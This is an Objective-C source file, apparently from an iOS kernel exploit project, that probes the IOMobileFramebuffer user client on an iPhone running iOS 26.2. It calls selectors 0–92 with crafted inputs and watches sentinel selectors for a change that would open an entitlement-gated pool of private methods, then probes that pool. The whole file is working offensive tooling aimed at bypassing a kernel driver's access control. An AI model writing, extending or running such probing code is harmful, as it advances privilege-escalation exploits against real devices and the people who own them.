/* iomfb_probe_v3.m — IOMFB UserClient gate-flip hunter.
   (iOS 26.2 / 23C55, iPhone14,5-A15, non-WebKit lane.)
   Device facts (iomsel_20261018-121007.log): on t0, live pool s93..127
   returns 0xe0000001 for EVERY arity and struct size; s83 returns
   0xe00002c2 this run but returned 0xe00002c1 (arg-validation!) in the
   11:41 run — the pre-argument gate is SETTABLE session state, not a
   fixed denial. Kernel strings name it: "com.apple.private.iomfb
   .set-block-client-profile". Sel map 46..127 (kernel string table)
   = RuntimeProperty API: BlendOutputCSCMethod .. PixelCapture etc.
   Plan: on one fresh t0 conn:
     A) fingerprint sels 0..92 (SCAL n2 with in={sel,0}; STRC sz16);
     B) after each fingerprint, re-fingerprint the SENTINEL pair
        (s83 SCAL n2, s93 SCAL n2); store baseline first;
     C) if a call changes any sentinel kr -> that sel is the gate
        opener; log the flip and immediately probe the whole live
        pool again (n2 sc / sz64 st) to see what unlocked.       */
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include "exploit.h"

#define mlv3(fmt, ...) nk_log(fmt, ##__VA_ARGS__)

static void yield3(void) { usleep(40000); }

static kern_return_t call_scal2(io_connect_t c, uint32_t sel) {
    uint64_t in[2] = { sel, 0 };
    uint64_t out[8];
    uint32_t oc = 8;
    return IOConnectCallMethod(c, sel, in, 2, NULL, 0, out, &oc, NULL, NULL);
}

static kern_return_t call_strc16(io_connect_t c, uint32_t sel) {
    uint8_t in[16], out[256];
    memset(in, 0xAA, sizeof(in));
    memset(in + 8, 0x00, 8);
    size_t osz = sizeof(out);
    bzero(out, sizeof(out));
    return IOConnectCallStructMethod(c, sel, in, sizeof(in), out, &osz);
}

static const uint32_t POOL[35] = {
    83, 93, 94, 95, 96, 97, 98, 99, 100,
    101, 102, 103, 104, 105, 106, 107, 108, 109, 110,
    111, 112, 113, 114, 115, 116, 117, 118, 119, 120,
    121, 122, 123, 124, 127
};
#define POOL_N 35

void nk_iomfb_v3_run(void) {
    nk_filelog_open("iomfbg");
    nk_log("[g] v3 session start (gate-flip hunter)");
    CFMutableDictionaryRef md = IOServiceMatching("IOMobileFramebuffer");
    if (!md) { nk_log("[g] no matching dict"); nk_filelog_close(); return; }
    io_iterator_t it = 0;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault, md, &it);
    if (kr != KERN_SUCCESS) {
        nk_log("[g] match kr=0x%x", kr);
        nk_filelog_close(); return;
    }
    io_object_t svc = IOIteratorNext(it);
    if (!svc) {
        nk_log("[g] no service");
        IOObjectRelease(it); nk_filelog_close(); return;
    }
    io_connect_t c = 0;
    kr = IOServiceOpen(svc, mach_task_self(), 0, &c);
    IOObjectRelease(svc);
    IOObjectRelease(it);
    if (kr != KERN_SUCCESS) {
        nk_log("[g] open t0 kr=0x%x", kr);
        nk_filelog_close(); return;
    }
    mlv3("[g] open t0 ok");
    sleep(2);

    /* baseline sentinels */
    kern_return_t b83 = call_scal2(c, 83);
    kern_return_t b93 = call_scal2(c, 93);
    mlv3("[g] baseline s83=0x%x s93=0x%x", b83, b93);

    uint32_t ops = 2;
    kern_return_t base[93];
    for (uint32_t sel = 0; sel < 93; sel++) {
        kern_return_t k1 = call_scal2(c, sel);
        kern_return_t k2 = call_strc16(c, sel);
        ops += 2;
        base[sel] = k1;
        mlv3("[g] A s%u sc=0x%x st=0x%x", sel, k1, k2);
        /* sentinel re-check */
        kern_return_t n83 = call_scal2(c, 83);
        kern_return_t n93 = call_scal2(c, 93);
        ops += 2;
        if (n83 != b83 || n93 != b93) {
            mlv3("[g] FLIP after s%u: s83 0x%x->0x%x s93 0x%x->0x%x",
                 sel, b83, n83, b93, n93);
            /* immediate live-pool re-probe */
            for (unsigned i = 0; i < POOL_N; i++) {
                uint32_t s2 = POOL[i];
                uint64_t out2[8];
                uint32_t oc2 = 8;
                uint64_t in2[2] = { s2, 0 };
                kern_return_t ks = IOConnectCallMethod(
                    c, s2, in2, 2, NULL, 0, out2, &oc2, NULL, NULL);
                uint8_t stb[64], outb[256];
                memset(stb, 0xAA, sizeof(stb));
                size_t osz = sizeof(outb);
                bzero(outb, sizeof(outb));
                kern_return_t kt = IOConnectCallStructMethod(
                    c, s2, stb, sizeof(stb), outb, &osz);
                ops += 2;
                mlv3("[g] POST s%u sc=0x%x st=0x%x", s2, ks, kt);
            }
        }
        if ((ops & 0xff) == 0) yield3();
    }
    IOServiceClose(c);
    sleep(2);
    nk_log("[g] v3 end ops=%u (FLIP lines above mark gate openers)", ops);
    nk_filelog_close();
}
